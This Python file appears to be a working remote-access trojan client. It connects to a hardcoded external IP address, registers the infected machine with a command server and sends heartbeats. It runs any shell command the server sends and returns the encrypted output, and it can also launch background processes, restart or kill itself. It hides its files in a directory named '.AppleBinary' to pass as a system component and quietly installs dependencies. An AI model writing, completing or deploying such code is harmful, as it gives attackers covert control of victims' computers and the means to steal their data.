import socket
from sys import executable,argv
from threading import Thread
from subprocess import check_output,Popen
from time import sleep, time
from os import _exit, path, mkdir, execl
from random import randint
try:
    from cryptography.fernet import Fernet
except Exception as e:
    Popen(['pip3','install','cryptography'])
    Popen(['brew','install','python-cryptography'])#Target non-pip python systems, brew managed systems
    from cryptography.fernet import Fernet

global username
    
ip = "116.89.46.43"
# ip = 'localhost'
port = 8872
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect((ip, port))
except Exception as e:
    _exit(0)
item = sock.recv(256)
print(item)
gkey = Fernet(item)

def genuser():
    username=''.join(str(randint(1,9)) for _ in range(8))
    return username

def initialiser(username):
    with open(userfp,'w') as f:
        f.write(username)
    sock.send(gkey.encrypt(f"initstats tg {username}".encode()))
    a = sock.recv(256)
    rsp = gkey.decrypt(a).decode()
    if rsp != "0":
        Thread(target=handler,args=(username,)).start()
        Thread(target=hb,args=(username,)).start()
        return 0
    else:
        sock.send(gkey.encrypt(f"dinit tg {username}".encode()))
        rsp = gkey.decrypt(sock.recv(256)).decode()
        if rsp == "0":
            Thread(target=handler,args=(username,)).start()
            Thread(target=hb,args=(username,)).start()
            return 0
        else:
            _exit(0)
            

def hb(u):
    while True:
        sock.send(gkey.encrypt(f"hb {u}".encode()))
        sleep(3.5)


#DATAT(ci) tg(role) USERNAME(username) ABCDEFG(content) vkey(this is the vkey)

def handler(username):
    last_data = None
    while True:
        vkeyb = Fernet.generate_key()
        vkey = Fernet(vkeyb)
        edata = sock.recv(262144)
        data = gkey.decrypt(edata).decode()
        # print(f"Last data: {last_data}")
        # print(data)
        if last_data != edata:
            if data not in ['reset','kill','DS','hb:ok']:
                last_data = data
                tokens = data.split(" ",1)
                ci = tokens[0]
                print(data)
                if ci == "exec":
                    ec = tokens[1]
                    #replace further with interactive shell session, use check_output for now
                    try:
                        print("works")
                        output = check_output(ec,shell=True)
                    except Exception as e:
                        print(e)
                        output = f"An Error has occured.\n\n Details: {e}]".encode()
                    eoutput = vkey.encrypt(output).decode()
                    response = f"DATAT tg {username} {eoutput} {vkeyb.decode()}"
                elif ci == "bg":
                    Popen(tokens[1],shell=True)
                elif data == "SYN":
                    print(data)
                    response = f"DATAT tg {username} {vkey.encrypt(b'ACK').decode()} {vkeyb.decode()}"
                else:
                    response = f"DATAT tg {username} {vkey.encrypt(b'1').decode()} {vkeyb.decode()}"
                    
                #continue with the control system
                sock.send(gkey.encrypt(response.encode()))

            elif data == "reset":
                execl(executable, executable, *argv)
            elif data == "kill":
                _exit(0)
                





#make required files
fp = ".AppleBinary"
userfp = fp + "/id.conf"
setu=False

username = check_output(["whoami"]).decode().strip()
if not path.exists(fp):
    mkdir(fp)
if path.exists(userfp):
    with open(userfp,'r') as f:
        username = f.read().splitlines()[0]

initialiser(username)
